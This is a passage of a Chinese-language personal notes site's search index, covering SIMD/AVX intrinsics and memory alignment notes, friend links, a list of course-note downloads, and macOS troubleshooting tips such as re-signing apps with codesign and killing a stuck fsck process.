\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e8c\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy Intel Intrinsics Guide SIMD \u7b80\u4ecb - \u77e5\u4e4e \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e","title":"\u5411\u91cf\u5316\u8ba1\u7b97"},{"location":"hpc/hpc101/vectorized/#numpy","text":"\u8be6\u89c1 Computer Science > \u7f16\u7a0b\u8bed\u8a00 > Python > NumPy","title":"NumPy \u57fa\u7840"},{"location":"hpc/hpc101/vectorized/#simd","text":"\u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff08Single Instruction Multiple Data\uff09\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u63d0\u4f9b\u4e86\u901a\u8fc7\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u591a\u4e2a\u8fd0\u7b97\u7684\u65b9\u6cd5 \u5728 x86 \u67b6\u6784\u4e0b\uff0cSIMD \u4e00\u534a\u548c SSE \u548c AVX \u7b49\u6307\u4ee4\u96c6\u8054\u7cfb\u5728\u4e00\u8d77\uff0cSSE \u548c AVX \u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u4e86\u5927\u91cf\u53ef\u4ee5\u5355\u6307\u4ee4\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u5355\u5143\u7684\u6307\u4ee4 SIMD \u76f4\u89c9\u4e0a\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u5347\u6548\u7387\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\uff0c\u6bd4\u5982\u5185\u5b58\u5e26\u5bbd\u4f7f\u7528\u3001\u89e3\u7801\u6d88\u8017\u7b49\uff0c\u9700\u8981\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\uff0c\u5e76\u4e0d\u4ee3\u8868\u53ef\u4ee5\u540c\u65f6\u64cd\u4f5c\u4e24\u4e2a\u6570\u636e\uff0c\u52a0\u901f\u6bd4\u5c31\u662f 2","title":"SIMD"},{"location":"hpc/hpc101/vectorized/#simd_1","text":"","title":"SIMD \u57fa\u7840"},{"location":"hpc/hpc101/vectorized/#_2","text":"1996 \u5e74 Intel \u63a8\u51fa\u4e86 x86 \u7684 MMX\uff08MultiMedia eXtension\uff09\u6307\u4ee4\u96c6\u6269\u5c55\uff0cMMX \u5b9a\u4e49\u4e86 8 \u4e2a MM \u5bc4\u5b58\u5668\uff0c\u79f0\u4e3a MM0 \u5230 MM7\uff0c\u4ee5\u53ca\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 64 \u4f4d\u5bbd\uff0c\u53ef\u7528\u4e8e\u4ee5\u201c\u538b\u7f29\u201d\u683c\u5f0f\u4fdd\u5b58 64 \u4f4d\u6574\u6570\u6216\u591a\u4e2a\u8f83\u5c0f\u6574\u6570\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u5355\u4e2a\u6307\u4ee4\u4e00\u6b21\u5e94\u7528\u4e8e\u4e24\u4e2a 32 \u4f4d\u6574\u6570\uff0c\u56db\u4e2a 16 \u4f4d\u6574\u6570\u6216\u516b\u4e2a 8 \u4f4d\u6574\u6570 Intel \u5728 1999 \u5e74\u53c8\u63a8\u51fa\u4e86\u5168\u9762\u8986\u76d6 MMX \u7684 SSE\uff08Streaming SIMD Extensions\uff0c\u6d41\u5f0f SIMD \u6269\u5c55\uff09\u6307\u4ee4\u96c6\uff0cSSE \u6dfb\u52a0\u4e86 8 \u4e2a\u65b0\u7684 128 \u4f4d\u5bc4\u5b58\u5668\uff0cXMM0 \u5230XMM7\uff0c\u800c\u540e\u6765\u7684 x86_64 \u6269\u5c55\u53c8\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u4e86 8 \u4e2a\u5bc4\u5b58\u5668\uff0cXMM8 \u5230 XMM15\u3002SSE \u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u4e4b\u540e\u7684 SSE2 \u5219\u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c2 \u4e2a 64 \u4f4d\u6574\u6570\u6216 4 \u4e2a 32 \u4f4d\u6574\u6570\u6216 8 \u4e2a 16 \u4f4d\u77ed\u6574\u5f62\u3002SSE2 \u4e4b\u540e\u8fd8\u6709 SSE3\uff0cSSE4 \u4ee5\u53ca AVX\uff0cAVX2 \u7b49\u6269\u5c55\u6307\u4ee4\u96c6 AVX \u5f15\u5165\u4e86 16 \u4e2a 256 \u4f4d\u5bc4\u5b58\u5668\uff0cYMM0 \u81f3 YMM15\uff0cAVX \u7684 256 \u4f4d\u5bc4\u5b58\u5668\u548c SSE \u7684 128 \u4f4d\u5bc4\u5b58\u5668\u5b58\u5728\u7740\u76f8\u4e92\u91cd\u53e0\u7684\u5173\u7cfb\uff08XMM \u5bc4\u5b58\u5668\u4e3a YMM \u5bc4\u5b58\u5668\u7684\u4f4e 128\u4f4d\uff0c\u7c7b\u4f3c 8086 \u4e2d\u7684 ax \u4e0e al\uff09\u3002AVX256 \u652f\u6301\u5728\u4e00\u4e2a YMM \u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 AVX512 \u589e\u52a0\u4e86 512 \u4f4d\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u64cd\u4f5c\uff0c\u4f46\u662f\u6548\u7387\u4e0d\u9ad8\u3001\u4f1a\u4f7f\u5904\u7406\u5668\u53d1\u70ed\u4e25\u91cd\u3001\u4ee5\u53ca\u5f88\u53ef\u80fd\u4f1a\u51fa\u73b0\u8d1f\u4f18\u5316\uff0c\u6240\u4ee5\u4e00\u822c\u4e0d\u4f7f\u7528 Linux \u53ef\u4ee5\u901a\u8fc7 cat /proc/cpuinfo \u6765\u67e5\u770b CPU \u652f\u6301\u7684\u6307\u4ee4\u96c6\uff0cmacOS \u53ef\u4ee5\u901a\u8fc7 sysctl -a | grep machdep.cpu.features \u6765\u67e5\u770b","title":"\u53d1\u5c55\u7b80\u53f2"},{"location":"hpc/hpc101/vectorized/#simd_2","text":"\u6709\u5f88\u591a\u79cd\u4f7f\u7528 SIMD \u7684\u65b9\u6cd5\uff0c\u4ece\u9876\u5c42\u5230\u5e95\u5c42\u4f9d\u6b21\u662f\uff1a \u4f7f\u7528 Intel \u5f00\u53d1\u7684\u8de8\u5e73\u53f0\u51fd\u6570\u5e93\uff08IPP\uff0cIntel Integrated Performance Primitives\uff09\uff0c\u91cc\u9762\u7684\u6307\u4ee4\u662f\u4f7f\u7528 SIMD \u4f18\u5316\u8fc7\u7684 \u81ea\u52a8\u5411\u91cf\u5316\uff08Auto-vectorization\uff09\uff0c\u7531\u7f16\u8bd1\u5668\u5c06\u6807\u91cf\u4f18\u5316\u4e3a\u5411\u91cf\u64cd\u4f5c \u4f7f\u7528\u7f16\u8bd1\u5668\u6307\u793a\u7b26\uff08Compiler directive\uff09\uff0c\u5373\u4f7f\u7528 #progma simd \u5f3a\u5236\u5faa\u73af\u5411\u91cf\u5316 \u4f7f\u7528\u5185\u7f6e\u51fd\u6570\uff08Intrinsics\uff09\uff0cIntel \u63d0\u4f9b\u7684\u4e00\u4e9b\u6307\u4ee4\u7684\u5305\u88c5 \u76f4\u63a5\u7f16\u5199\u6c47\u7f16\u4ee3\u7801 \u624b\u5199 SIMD \u4e00\u822c\u4f7f\u7528 Intrinsics \u6765\u5b9e\u73b0 \u7b80\u5355\u60c5\u51b5\u4e0b\u6ca1\u6709\u5fc5\u8981\u624b\u5199\uff0c\u901a\u8fc7 -O3 -mavx2 \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4f18\u5316\u5730\u5f88\u597d\u3002\u4f46\u5982\u679c\u4ee3\u7801\u7ed3\u6784\u590d\u6742\uff0c\u5faa\u73af\u96be\u4ee5\u754c\u5b9a\u8fb9\u754c\uff0c\u751a\u81f3\u8fd8\u6709\u5206\u652f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u9700\u8981\u624b\u5199 SIMD","title":"SIMD \u4f7f\u7528\u65b9\u6cd5"},{"location":"hpc/hpc101/vectorized/#sseavx-intrinsics","text":"","title":"SSE/AVX Intrinsics"},{"location":"hpc/hpc101/vectorized/#_3","text":"\u63d0\u4f9b\u8fd9\u4e9b intrinsics \u7684\u5934\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ? mmintrin.h \u6765\u5bfc\u5165\uff0c\u4e0d\u540c\u6307\u4ee4\u96c6\u7684\u5934\u6587\u4ef6\u4e0d\u540c\uff1a xmmintrin.h \uff1aSSE\uff0c\u652f\u6301\u540c\u65f6\u5bf9 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c emmintrin.h \uff1aSSE 2\uff0c\u652f\u6301\u540c\u65f6\u5bf9 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c pmmintrin.h \uff1aSSE 3\uff0c\u652f\u6301\u5bf9 SIMD \u5bc4\u5b58\u5668\u7684\u6c34\u5e73\u64cd\u4f5c\uff08horizontal operation\uff09\uff0c\u5982 hadd, hsub \u7b49... tmmintrin.h \uff1aSSSE 3\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions smmintrin.h \uff1aSSE 4.1\uff0c\u652f\u6301\u70b9\u4e58\u4ee5\u53ca\u66f4\u591a\u7684\u6574\u5f62\u64cd\u4f5c nmmintrin.h \uff1aSSE 4.2\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions immintrin.h \uff1aAVX\uff0c\u652f\u6301\u540c\u65f6\u64cd\u4f5c 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 \u800c\u4e14\u540e\u9762\u7684\u5934\u6587\u4ef6\u5305\u542b\u524d\u9762\u6240\u6709\u7684\u5185\u5bb9","title":"\u5934\u6587\u4ef6"},{"location":"hpc/hpc101/vectorized/#_4","text":"\u989d\u5916\u6570\u636e\u7c7b\u578b\u4ee5 __m xxx [ T ] \u7684\u5f62\u5f0f\u547d\u540d\uff1a xxx \uff1a\u5b58\u50a8\u6570\u636e\u7684\u603b\u4f4d\u6570\uff0c\u6bd4\u5982 128\u3001256 [ T ]\uff1a\u5b58\u50a8\u7684\u6bcf\u4e2a\u5355\u5143\u7684\u7c7b\u578b\uff0c\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7701\u7565\uff0c\u6574\u578b\u4e3a i\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u4e3a d \u4f8b\u5982\u5b58\u50a8\u4e86 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684 256 \u4f4d\u6570\u636e\u7684\u7c7b\u578b\u4e3a __m256d","title":"\u6570\u636e\u7c7b\u578b"},{"location":"hpc/hpc101/vectorized/#_5","text":"Intrinsics \u63d0\u4f9b\u7684\u51fd\u6570\u4e00\u822c\u4ee5 _mm[ xxx ]_ name _ PT \u7684\u5f62\u5f0f\u547d\u540d\uff1a [ xxx ]\uff1a\u64cd\u4f5c\u6570\u7684\u4f4d\u6570\uff0c\u82e5\u4e3a 128 \u5219\u7701\u7565 name \uff1a\u51fd\u6570\u540d\u79f0\uff0c\u548c\u7528\u5904\u76f8\u5173 P \uff1a\u5411\u91cf\u64cd\u4f5c\u8fd8\u662f\u6807\u91cf\u64cd\u4f5c p \u8868\u793a\u5411\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ps \u5bf9\u56db\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u540c\u65f6\u8fdb\u884c\u52a0\u6cd5 s \u8868\u793a\u6807\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ss \u53ea\u5bf9\u6700\u4f4e\u4f4d\u7684\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8fdb\u884c\u52a0\u6cd5 \u5bf9\u4e8e\u6574\u578b\u5411\u91cf\u64cd\u4f5c\uff0cMMX \u6307\u4ee4\u96c6\uff08\u64cd\u4f5c\u6570\u4e3a 64 \u4f4d\uff09\u4f7f\u7528 p\u3001\u5176\u5b83\u60c5\u51b5\u4e0b\u4e3a ep\uff0c\u4f8b\uff1a __m64 _mm_add_pi8 ( __m64 a , __m64 b ) __m128i _mm_add_epi8 ( __m128i a , __m128i b ) T \uff1a\u64cd\u4f5c\u6570\u7684\u6570\u636e\u7c7b\u578b \u6d6e\u70b9\u578b\uff1a\u5355\u7cbe\u5ea6\u4e3a s\u3001\u53cc\u7cbe\u5ea6\u4e3a d \u6574\u578b\uff1a\u6709\u7b26\u53f7 i size \u3001\u65e0\u7b26\u53f7 u size \uff0c size \u8868\u793a\u6bcf\u4e2a\u5355\u5143\u4e2d\u6574\u578b\u7684\u5bbd\u5ea6 \u4e3b\u8981\u5206\u7c7b\uff1a \u5b58/\u53d6\uff08store/load/set\uff09 load \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\uff0c\u8bfb\u53d6\u5bf9\u5e94\u4f4d\u7f6e\u5f00\u59cb\u7684\u5185\u5bb9\uff0c\u8fd4\u56de\u5bf9\u5e94\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf load \u8981\u6c42\u5185\u5b58\u5bf9\u9f50\uff08\u4e0b\u9762\u8bf4\uff09 loadu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 loadr \u53cd\u5411\u8bfb\u53d6 store \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\u8868\u793a\u5f00\u59cb\u5b58\u653e\u7684\u9996\u5730\u5740\uff0c\u548c\u4e00\u4e2a\u5f85\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u65e0\u8fd4\u56de\u503c store \u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storeu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storer \u53cd\u5411\u5b58\u50a8 set \u7c7b\u51fd\u6570\u76f4\u63a5\u63a5\u6536\u591a\u4e2a\u5f85\u5b58\u50a8\u7684\u666e\u901a\u7c7b\u578b\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u5927\u7c7b\u578b\u7684\u53d8\u91cf \u7b97\u672f\u8fd0\u7b97\uff1aadd sub mul div sqrt \u52a0\u51cf\u4e58\u9664\u5f00\u6839\u53f7\uff0crcp \u6c42\u5012\u6570\u3001dp \u8ba1\u7b97\u70b9\u4e58 \u2026\u2026 \u6bd4\u8f83\u8fd0\u7b97\uff1amax min cmpeq cmpge cmpgt cmple \u2026\u2026 \u903b\u8f91\u8fd0\u7b97\uff1aand or xor\u3001andnot \u5148\u5bf9\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u6c42 not \u7136\u540e\u9010\u5206\u91cf and \u2026\u2026 Swizzle \u8fd0\u7b97\uff1ashuffle blend movelh \u5b8c\u6574\u7684\u6307\u4ee4\u96c6\u5bf9\u5e94 Intrinsics \u51fd\u6570\u5217\u8868\u4ee5\u53ca\u7528\u6cd5\u7528\u9014\u89c1\uff1a Intel Intrinsics Guide","title":"\u51fd\u6570"},{"location":"hpc/hpc101/vectorized/#_6","text":"\u4e00\u822c\u7684\u5b58\u53d6\u64cd\u4f5c\u8981\u6c42\u5b58\u53d6\u7684\u5185\u5b58\u662f\u5bf9\u9f50\u7684\uff0c\u6bd4\u5982 _mm_load_ps \u8981\u6c42 16 \u4f4d\u5bf9\u9f50\uff08\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u7684\u5730\u5740\u53ef\u4ee5\u88ab 16 \u6574\u9664\uff0c\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff09\u3001_mm256_load_ps \u8981\u6c42 32 \u4f4d\u5bf9\u9f50\uff08\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff0c\u5012\u6570\u7b2c\u4e8c\u4f4d\u4e3a\u5076\uff09 \u5728\u6808\u4e0a\u5f3a\u5236\u8fdb\u884c 32 \u4f4d\u5185\u5b58\u5bf9\u9f50\uff1a gcc \u8bed\u6cd5\uff1a__attribute__ ((aligned (32))) double a[4] MSVC \u8bed\u6cd5\uff1a__declspec(align(32)) double a[4] \u8fd9\u6837\u5b9a\u4e49\u7684\u5305\u542b\u56db\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6570\u7ec4 a \u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 _mm256_load_pd \u6765\u8bfb\u53d6 \u66f4\u591a\u5173\u4e8e\u5185\u5b58\u5bf9\u9f50\uff0c\u89c1 \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e","title":"\u5185\u5b58\u5bf9\u9f50"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u670b\u53cb\u4eec\u7684\u7b14\u8bb0\u672c\uff01 Isshiki\u4fee's Notebook \u4fee\u4f6c tql\uff01 \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 \u4e00\u4e2a\u597d\u602a\u7684\u5b66\u957f\uff08\u5212\u6389 widcardw \u7684\u7b14\u8bb0 wid \u597d\u5f3a\uff0c\u7b14\u8bb0\u597d\u597d\u770b chenyuan \u7684\u6280\u672f\u7b14\u8bb0\u672c \\cydl/\\cydl/\\cydl/ \u514b\u745e\u5947\u7684\u7b14\u8bb0\u672c \u4e5f\u662f\u4e00\u4e2a\u597d\u5f3a\u7684\u5b66\u957f/\u62dc\u8c22 Matheart's Note \u662f\u6570\u5fc3\u8036\uff08\u5927\u80a5\u9e3d\u5b50\u597d\u4e45\u6ca1\u66f4\u65b0\u4e86 GZTime's Blog \u8fd9\u4e2a\u61d2\u86cb\u8fd8\u6ca1\u641e note\uff0c\u4e22\u4e2a blog \u5427 \u70e7\u98ce\u7684\u535a\u5ba2 \u4e00\u4e2a\u5f88\u5f3a\u7684 up \u4e3b@\u70e7\u98ce","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u670b\u53cb\u4eec\u7684\u7b14\u8bb0\u672c\uff01 Isshiki\u4fee's Notebook \u4fee\u4f6c tql\uff01 \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 \u4e00\u4e2a\u597d\u602a\u7684\u5b66\u957f\uff08\u5212\u6389 widcardw \u7684\u7b14\u8bb0 wid \u597d\u5f3a\uff0c\u7b14\u8bb0\u597d\u597d\u770b chenyuan \u7684\u6280\u672f\u7b14\u8bb0\u672c \\cydl/\\cydl/\\cydl/ \u514b\u745e\u5947\u7684\u7b14\u8bb0\u672c \u4e5f\u662f\u4e00\u4e2a\u597d\u5f3a\u7684\u5b66\u957f/\u62dc\u8c22 Matheart's Note \u662f\u6570\u5fc3\u8036\uff08\u5927\u80a5\u9e3d\u5b50\u597d\u4e45\u6ca1\u66f4\u65b0\u4e86 GZTime's Blog \u8fd9\u4e2a\u61d2\u86cb\u8fd8\u6ca1\u641e note\uff0c\u4e22\u4e2a blog \u5427 \u70e7\u98ce\u7684\u535a\u5ba2 \u4e00\u4e2a\u5f88\u5f3a\u7684 up \u4e3b@\u70e7\u98ce","title":"\u53cb\u94fe"},{"location":"others/","text":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7b14\u8bb0\uff0c\u8fd8\u6709\u5176\u5b83\u4e0d\u597d\u5206\u7c7b\u7684\u4e1c\u897f\uff08\uff1f Table of Contents \u00b6 ZJU \u8bfe\u7a0b\u624b\u5199\u7b14\u8bb0\u6c47\u603b","title":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f"},{"location":"others/#_1","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7b14\u8bb0\uff0c\u8fd8\u6709\u5176\u5b83\u4e0d\u597d\u5206\u7c7b\u7684\u4e1c\u897f\uff08\uff1f","title":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f"},{"location":"others/#table-of-contents","text":"ZJU \u8bfe\u7a0b\u624b\u5199\u7b14\u8bb0\u6c47\u603b","title":"Table of Contents"},{"location":"others/notes/","text":"ZJU \u90e8\u5206\u8bfe\u7a0b\u7b14\u8bb0 \u00b6 Abstract \u90e8\u5206\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\uff08\u4e3b\u8981\u662f\u6570\u7406\u57fa\u7840\u8bfe\u7a0b\uff09\u7684\u624b\u5199\u7b14\u8bb0 \u5185\u5bb9\u5927\u591a\u662f \u8003\u8bd5\u5468\u8865\u5929\u7684\u65f6\u5019 \u63d0\u53d6\u7684\u9ad8\u6d53\u5ea6\u6982\u5ff5\u4e00\u7c7b\uff0c\u5927\u6982\u5c31\u662f\u590d\u4e60\u7b14\u8bb0\u5427\uff08 \u81ea\u7136\u79d1\u5b66\u901a\u8bc6\u7c7b \u00b6 \u6570\u5b66\u5206\u6790\uff08\u7532\uff09I\uff08H\uff09\u7b14\u8bb0 10.8 MB / 12 P / 2022-01-04 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 I\uff08H\uff09\u7b14\u8bb0 12.4 MB / 12 P / 2022-01-09 \u4e0b\u8f7d \u6570\u5b66\u5206\u6790\uff08\u7532\uff09II\uff08H\uff09\u7b14\u8bb0 16.4 MB / 15 P / 2022-06-13 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 II\uff08H\uff09\u7b14\u8bb0 8.8 MB / 8 P / 2022-06-17 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66 I\uff08H\uff09\u7b14\u8bb0 4 MB / 5 P / 2022-06-16 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I \u7b14\u8bb0 4.5 MB / 3 P / 2022-06-18 \u4e0b\u8f7d \u4e13\u4e1a\u57fa\u7840\u8bfe\u7a0b \u00b6 \u79bb\u6563\u6570\u5b66\u7406\u8bba\u57fa\u7840\u7b14\u8bb0 8.2 MB / 8 P / 2022-06-09 \u4e0b\u8f7d","title":"\u8bfe\u7a0b\u7b14\u8bb0"},{"location":"others/notes/#zju","text":"Abstract \u90e8\u5206\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\uff08\u4e3b\u8981\u662f\u6570\u7406\u57fa\u7840\u8bfe\u7a0b\uff09\u7684\u624b\u5199\u7b14\u8bb0 \u5185\u5bb9\u5927\u591a\u662f \u8003\u8bd5\u5468\u8865\u5929\u7684\u65f6\u5019 \u63d0\u53d6\u7684\u9ad8\u6d53\u5ea6\u6982\u5ff5\u4e00\u7c7b\uff0c\u5927\u6982\u5c31\u662f\u590d\u4e60\u7b14\u8bb0\u5427\uff08","title":"ZJU \u90e8\u5206\u8bfe\u7a0b\u7b14\u8bb0"},{"location":"others/notes/#_1","text":"\u6570\u5b66\u5206\u6790\uff08\u7532\uff09I\uff08H\uff09\u7b14\u8bb0 10.8 MB / 12 P / 2022-01-04 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 I\uff08H\uff09\u7b14\u8bb0 12.4 MB / 12 P / 2022-01-09 \u4e0b\u8f7d \u6570\u5b66\u5206\u6790\uff08\u7532\uff09II\uff08H\uff09\u7b14\u8bb0 16.4 MB / 15 P / 2022-06-13 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 II\uff08H\uff09\u7b14\u8bb0 8.8 MB / 8 P / 2022-06-17 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66 I\uff08H\uff09\u7b14\u8bb0 4 MB / 5 P / 2022-06-16 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I \u7b14\u8bb0 4.5 MB / 3 P / 2022-06-18 \u4e0b\u8f7d","title":"\u81ea\u7136\u79d1\u5b66\u901a\u8bc6\u7c7b"},{"location":"others/notes/#_2","text":"\u79bb\u6563\u6570\u5b66\u7406\u8bba\u57fa\u7840\u7b14\u8bb0 8.2 MB / 8 P / 2022-06-09 \u4e0b\u8f7d","title":"\u4e13\u4e1a\u57fa\u7840\u8bfe\u7a0b"},{"location":"others/troubleshooting/","text":"TroubleShooting \u00b6 Abstract \u5b58\u6863\u4e00\u4e9b\u89e3\u51b3\u8fc7\u7684\u7591\u96be\u6742\u75c7\uff0c\u65b9\u4fbf\u4ee5\u540e\u518d\u6b21\u51fa\u73b0\u7684\u65f6\u5019\u67e5\u9605 Table of Contents \u00b6 macOS \u5e73\u53f0\u95ee\u9898","title":"TroubleShooting"},{"location":"others/troubleshooting/#troubleshooting","text":"Abstract \u5b58\u6863\u4e00\u4e9b\u89e3\u51b3\u8fc7\u7684\u7591\u96be\u6742\u75c7\uff0c\u65b9\u4fbf\u4ee5\u540e\u518d\u6b21\u51fa\u73b0\u7684\u65f6\u5019\u67e5\u9605","title":"TroubleShooting"},{"location":"others/troubleshooting/#table-of-contents","text":"macOS \u5e73\u53f0\u95ee\u9898","title":"Table of Contents"},{"location":"others/troubleshooting/mac/","text":"macOS TroubleShooting \u00b6 Abstract \u5728 macOS \u4e0a\u9047\u5230\u8fc7\u7684\u4e00\u4e9b\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6cd5 \u6709\u5173\u8f6f\u4ef6 \u00b6 \u8f6f\u4ef6\u65e0\u6cd5\u6253\u5f00 \u00b6 Warning \u8fd9\u90e8\u5206\u53ef\u80fd\u6709\u4e9b\u4e71\u5957\uff0c\u56e0\u4e3a\u662f\u56de\u5fc6\u51fa\u6765\u7684 \u65e0\u6cd5\u8ba4\u8bc1\u5f00\u53d1\u8005 \u76f4\u63a5\u901a\u8fc7\u8bbf\u8fbe\u53f3\u952e\u6253\u5f00\u8f6f\u4ef6\uff0c\u7b2c\u4e8c\u6b21\u5c31\u53ef\u4ee5\u5f3a\u5236\u6253\u5f00\uff0c\u540e\u7eed\u90fd\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00 \u5f3a\u5236\u7b7e\u540d codesign --sign - --force --deep /Applications/<app>.app \u5df2\u635f\u574f \u5bf9\u4e8e\u5305\u542b\u7834\u89e3\u7684\u8f6f\u4ef6\u7b49\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u5df2\u635f\u574f\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u6e05\u9664\u8f6f\u4ef6\u9694\u79bb\u5c5e\u6027\u6765\u89e3\u51b3 codesign --sign - --force --deep /Applications/<app>.app \u6709\u5173\u78c1\u76d8 \u00b6 \u79fb\u52a8\u786c\u76d8\u5f02\u5e38\u9000\u51fa\u65e0\u6cd5\u518d\u6b21\u6302\u8f7d \u00b6 \u5927\u6982\u5c31\u662f\u79fb\u52a8\u786c\u76d8\u7a81\u7136\u65ad\u8fde\uff0c\u7136\u540e\u91cd\u65b0\u63d2\u5165\u7684\u65f6\u5019\u770b\u4e0d\u5230\u78c1\u76d8\u3002\u5728\u7cfb\u7edf\u78c1\u76d8\u5de5\u5177\u91cc\u53ef\u4ee5\u770b\u5230\u4e00\u5757\u672a\u88c5\u8f7d\u7684\u78c1\u76d8\uff08 diskutil list \u4e5f\u53ef\u4ee5\u770b\u5230\uff09\uff0c\u4f46\u662f\u65e0\u6cd5\u6302\u8f7d\uff08com.apple.DiskManagement.disenter \u9519\u8bef 0\uff09\u3002 \u89e3\u51b3\u65b9\u6848\u6765\u81ea https://www.xiaocrab.net/post/macos-exfat-diskmanagementdisenter-error-0/ \u9996\u5148 ps aux | grep fsck \uff0c\u68c0\u67e5\u662f\u5426\u6709 fsck \u7a0b\u5e8f\uff0c\u8fd9\u662f\u5bf9\u78c1\u76d8\u8fdb\u884c\u68c0\u67e5\u4fee\u590d\u7684\u7a0b\u5e8f\uff0c\u53ef\u80fd\u662f\u8fd9\u91cc\u5361\u4f4f\u4e86\u3002\u7136\u540e sudo pkill -f fsck \u4e2d\u65ad\u8fdb\u7a0b\u3002\u63a5\u7740\u4f1a\u5f39\u51fa \u201cmacOS \u65e0\u6cd5\u4fee\u590d\u78c1\u76d8\u201d \u7684\u8b66\u544a\uff0c\u8fd9\u65f6\u786c\u76d8\u53ef\u4ee5\u88c5\u8f7d\u4e0a\uff0c\u4e0d\u8fc7\u662f\u53ea\u8bfb\u7684\u3002 \u4e0b\u4e00\u6b65\u662f\u5728 mac 